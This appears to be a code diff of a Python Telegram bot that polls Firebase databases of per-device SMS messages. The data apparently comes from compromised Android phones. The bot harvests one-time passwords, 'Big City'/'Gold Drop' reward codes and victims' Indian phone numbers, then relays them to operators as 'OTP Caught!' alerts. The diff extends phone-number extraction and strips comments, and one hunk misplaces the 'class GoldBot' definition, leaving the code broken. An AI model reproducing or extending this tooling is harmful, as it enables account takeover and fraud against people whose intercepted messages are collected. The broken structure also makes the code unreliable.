@@ -10,15 +10,9 @@ sys.stdout.reconfigure(encoding="utf-8")
 import functools
 print = functools.partial(print, flush=True)
 
-# ═══════════════════════════════════════════════════════
-#   Branding
-# ═══════════════════════════════════════════════════════
 BRAND_NAME = "Big City Reward Bot"
 REDEEM_URL = "https://www.golddropwins.com/"
 
-# ═══════════════════════════════════════════════════════
-#   Env
-# ═══════════════════════════════════════════════════════
 BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
 ADMIN_ID  = int(os.getenv("ADMIN_ID", "0") or 0)
 INTERVAL  = int(os.getenv("INTERVAL", "15") or 15)
@@ -43,7 +37,7 @@ WORKERS   = 20
 OTP_PATTERNS = [
     re.compile(r"OTP[^\d]{0,15}(\d{4,8})", re.I),
     re.compile(r"(\d{4,8})[^\d]{0,15}OTP", re.I),
-    re.compile(r"\b(\d{6,7})\b"), # Common 6 or 7 digit OTP
+    re.compile(r"\b(\d{6,7})\b"), 
 ]
 
 def reward_patterns(code_len):
@@ -53,9 +47,6 @@ def reward_patterns(code_len):
         re.compile(rf"Reward\s*Code\s*is\s*\*?\s*([A-Za-z0-9]{{8,20}})\b", re.I),
     ]
 
-# ═══════════════════════════════════════════════════════
-#   Storage
-# ═══════════════════════════════════════════════════════
 def parse_env_dbs():
     out = []
     if not FIREBASE_DBS_ENV: return out
@@ -66,8 +57,7 @@ def parse_env_dbs():
         else:
             url, key = item, ""
         if url.startswith("http"):
-            out.append({"url": url.rstrip("/"), "key": key,
-                        "added_at": int(time.time()), "source": "env"})
+            out.append({"url": url.rstrip("/"), "key": key, "added_at": int(time.time()), "source": "env"})
     return out
 
 def load_dbs():
@@ -83,19 +73,15 @@ def load_dbs():
     for d in env_dbs + file_dbs:
         u = d.get("url", "").rstrip("/")
         if u and u not in seen:
-            merged.append({"url": u, "key": d.get("key", ""),
-                           "added_at": d.get("added_at", int(time.time())),
-                           "source": d.get("source", "bot")})
+            merged.append({"url": u, "key": d.get("key", ""), "added_at": d.get("added_at", int(time.time())), "source": d.get("source", "bot")})
             seen.add(u)
     return merged
 
 def save_dbs(dbs):
     try:
         bot_only = [d for d in dbs if d.get("source") != "env"]
-        with open(DBS_FILE, "w", encoding="utf-8") as f:
-            json.dump(bot_only, f, indent=2)
-    except Exception as e:
-        print(f"[dbs] save err: {e}")
+        with open(DBS_FILE, "w", encoding="utf-8") as f: json.dump(bot_only, f, indent=2)
+    except Exception as e: print(f"[dbs] save err: {e}")
 
 def load_seen():
     try:
@@ -107,9 +93,6 @@ def save_seen(seen):
         with open(SEEN_FILE, "w", encoding="utf-8") as f: json.dump(sorted(seen), f)
     except Exception: pass
 
-# ═══════════════════════════════════════════════════════
-#   Extractors
-# ═══════════════════════════════════════════════════════
 def extract_reward(text, code_len):
     for rx in reward_patterns(code_len):
         m = rx.search(text or "")
@@ -118,8 +101,7 @@ def extract_reward(text, code_len):
 
 def extract_otp(text):
     t = (text or "").lower()
-    if "reward" in t and "code" in t: return "" # Skip reward messages
-    
+    if "reward" in t and "code" in t: return "" 
     for rx in OTP_PATTERNS:
         m = rx.search(text or "")
         if m: return m.group(1)
@@ -128,20 +110,18 @@ def extract_otp(text):
 def is_hit(sender, text):
     s = (sender or "").lower()
     t = (text or "").lower()
-    return ("golddrop" in s or "gold drop" in s or "bigcity" in s
-            or "golddrop" in t or "gold drop" in t
-            or "golddropwins" in t or "bigcity" in t or "big city" in t)
+    return ("golddrop" in s or "gold drop" in s or "bigcity" in s or "golddrop" in t or "gold drop" in t or "golddropwins" in t or "bigcity" in t or "big city" in t)
 
 def extract_phone(dev):
     def valid(m):
         m = re.sub(r"[^0-9]", "", str(m or ""))
         return m if len(m) == 10 and m[0] in "6789" else ""
     if not isinstance(dev, dict): return ""
-    for k in ("mobNo", "phoneNumber", "phone", "mobile", "msisdn", "subId", "number"):
+    for k in ("mobNo", "phoneNumber", "phone", "mobile", "msisdn", "subId", "number", "simNumber"):
         if dev.get(k):
             r = valid(dev[k])
             if r: return r
-    for c in ("sims", "action", "sms", "smsCommand", "webhookEvent", "sendSms", "commands"):
+    for c in ("sims", "action", "sms", "smsCommand", "webhookEvent", "sendSms", "commands", "sim"):
         cont = dev.get(c)
         items = (list(cont.values()) + [cont]) if isinstance(cont, dict) else (cont if isinstance(cont, list) else [])
         for it in items:
@@ -152,9 +132,6 @@ def extract_phone(dev):
                         if r: return r
     return ""
 
-# ═══════════════════════════════════════════════════════
-#   Firebase
-# ═══════════════════════════════════════════════════════
 def fb_get(session, base, path, key=""):
     url = f"{base}/{path}"
     if key: url += f"?auth={key}" if "?" not in url else f"&auth={key}"
@@ -200,18 +177,17 @@ def scan_db(session, base, key, last, code_len):
                 if not text.strip(): continue
                 msgs += 1
                 if is_hit(sender, text):
+                    phone = phones.get(did, "")
+                    if not phone: phone = extract_phone(m)
+                    
                     hits.append({
-                        "db": base, "device": did, "phone": phones.get(did, ""),
+                        "db": base, "device": did, "phone": phone,
                         "key": f"{base}|{did}|{mk}", "msgid": str(mk),
                         "sender": sender, "ts": str(m.get("dateTime", "") or m.get("time", "") or m.get("timestamp", "")),
                         "text": text, "otp": extract_otp(text), "reward": extract_reward(text, code_len),
                     })
     return len(dev_ids), msgs, hits, ""
-
-# ═══════════════════════════════════════════════════════
-#   Bot
-# ═══════════════════════════════════════════════════════
-class GoldBot:
+    class GoldBot:
     def __init__(self, session):
         self.session   = session
         self.token     = BOT_TOKEN
@@ -455,9 +431,6 @@ class GoldBot:
         else: lines.append("\n<i>No regular admins.</i>")
         self.send(cid, "\n".join(lines))
 
-    # ═══════════════════════════════════════════════════
-    #   Callback (OTP Catcher)
-    # ═══════════════════════════════════════════════════
     def handle_callback(self, cq):
         cid = cq["message"]["chat"]["id"]
         from_id = cq["from"]["id"]
@@ -474,22 +447,18 @@ class GoldBot:
 
             self.answer_cb(cq["id"], "🔍 Fetching latest OTP...")
             
-            # Fetch latest messages for this specific device
             ok, msgs = fb_get(self.session, ctx["db"], f"messages/{ctx['device']}.json?orderBy=\"$key\"&limitToLast=20", ctx["key"])
             if not ok or not isinstance(msgs, dict):
                 return self.send(cid, "❌ Firebase error while fetching OTP.")
 
             otp_found = ""
             otp_text = ""
-            # Iterate backwards (latest first)
             for mk in sorted(msgs.keys(), reverse=True):
                 m = msgs[mk]
                 if not isinstance(m, dict): continue
                 t = str(m.get("message", "") or m.get("body", "") or m.get("text", ""))
                 
-                # Skip if it's a Reward Code message so we don't catch parts of the code as OTP
-                if re.search(r"reward\s*code", t, re.I):
-                    continue
+                if re.search(r"reward\s*code", t, re.I): continue
                     
                 o = extract_otp(t)
                 if o:
@@ -498,7 +467,11 @@ class GoldBot:
                     break
             
             if otp_found:
-                phone_disp = f"+91 <code>{html.escape(ctx['phone'])}</code>" if ctx['phone'] else "Unknown"
+                if ctx['phone']:
+                    phone_disp = f"+91 <code>{html.escape(ctx['phone'])}</code>"
+                else:
+                    phone_disp = f"⚠️ <i>Unknown</i> (ID: <code>{html.escape(ctx['device'][:10])}...</code>)"
+                    
                 self.send(cid, f"🔑 <b>OTP Caught!</b>\n\n"
                                f"📱 <b>Number:</b> {phone_disp}\n"
                                f"🔢 <b>OTP:</b> <code>{html.escape(otp_found)}</code>\n\n"
@@ -506,20 +479,16 @@ class GoldBot:
             else:
                 self.send(cid, f"📭 No OTP found yet for this number.\nTry again after a few seconds.\n\n{self.brand()}")
 
-    # ═══════════════════════════════════════════════════
-    #   Hit formatting — No auto OTPs, only Rewards
-    # ═══════════════════════════════════════════════════
     def deliver(self, h):
-        if not h["reward"]: return # Only send rewards automatically.
+        if not h["reward"]: return
 
         clen = len(h["reward"])
         warn = "" if clen == self.code_len else f"\n⚠️ len={clen} (expected {self.code_len})"
         
-        # Split +91 and 10 digit number for easy copy
         if h['phone']:
             phone_text = f"+91 <code>{html.escape(h['phone'])}</code>"
         else:
-            phone_text = f"<code>{html.escape(h['device'][:15])}</code>"
+            phone_text = f"⚠️ <b>Unknown Number</b>\n🆔 ID: <code>{html.escape(h['device'])}</code>"
         
         ctx_id = str(uuid.uuid4())[:8]
         self.otp_context[ctx_id] = h
@@ -582,9 +551,6 @@ class GoldBot:
         self._stop.set()
         save_seen(self.seen); save_dbs(self.dbs); self._save_admins()
 
-# ═══════════════════════════════════════════════════════
-#   Main
-# ═══════════════════════════════════════════════════════
 def main():
     print("=" * 60)
     print(f"  {BRAND_NAME} — Railway")
